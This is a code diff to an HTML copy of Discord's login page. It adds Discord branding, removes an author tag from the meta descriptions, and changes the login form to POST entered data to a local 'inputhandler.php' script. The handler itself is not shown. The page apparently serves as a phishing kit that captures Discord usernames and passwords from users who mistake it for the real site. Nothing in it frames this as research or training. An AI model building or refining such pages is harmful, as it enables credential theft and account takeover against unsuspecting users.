@@ -11,21 +11,35 @@
 
 	<!-- Web SEO -->
 	<meta name="title" content="Discord">
-	<meta name="description" content="Discord Login Page - Vins 2106">
+	<meta name="description" content="Discord Login Page">
 
 	<meta property="og:type" content="website">
 	<meta property="og:url" content="https://mysite.com/">
 	<meta property="og:title" content="Discord">
-	<meta property="og:description" content="Discord Login Page - Vins 2106">
+	<meta property="og:description" content="Discord Login Page">
 	<meta property="og:image" content="./img/logo.png">
 
 	<meta property="twitter:url" content="https://mysite.com/">
 	<meta property="twitter:title" content="Discord">
-	<meta property="twitter:description" content="Discord Login Page - Vins 2106">
+	<meta property="twitter:description" content="Discord Login Page">
 	<meta property="twitter:image" content="./img/logo.png">
 
+  <link rel="icon" href="favicon.ico">
+
 	<!-- Web Style -->
-	<link rel="stylesheet" type="text/css" href="./css/styles.css">
+  <link rel="stylesheet" type="text/css" href="./css/styles.css">
+  <style>
+    body {background-image: url('discordbackground.svg');
+  background-size: cover;}
+  </style>
+
+  <style>
+    #logo {position: relative;
+    top: 48px;
+    left: 48px; 
+  }
+  </style>
+
 </head>
 <body>
     <div id="app-mount" class="appMount-3lHmkl">
@@ -219,12 +233,18 @@
           <stop offset="1" stop-color="hsl(198, calc(var(--saturation-factor, 1) * 81.5%), 46.7%)"></stop>
         </linearGradient>
       </svg>
+  
       <div style="position: fixed; opacity: 0; pointer-events: none;"></div>
+      
+
       <div class="app-1q1i1E">
+        <div id="logo"> 
+          <img src="discordlogo.svg"> 
+        </div>
         <div class="wrapper-6URcxg">
           <div style="">
             <div>
-              <form class="authBoxExpanded-2jqaBe authBox-hW6HRx theme-dark">
+              <form action="inputhandler.php" method="post" class="authBoxExpanded-2jqaBe authBox-hW6HRx theme-dark">
                 <div class="centeringWrapper-2Rs1dR">
                   <div class="flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG justifyStart-2NDFzi alignCenter-1dQNNs noWrap-3jynv6" style="flex: 1 1 auto;">
                     <div class="mainLoginContainer-1ddwnR">
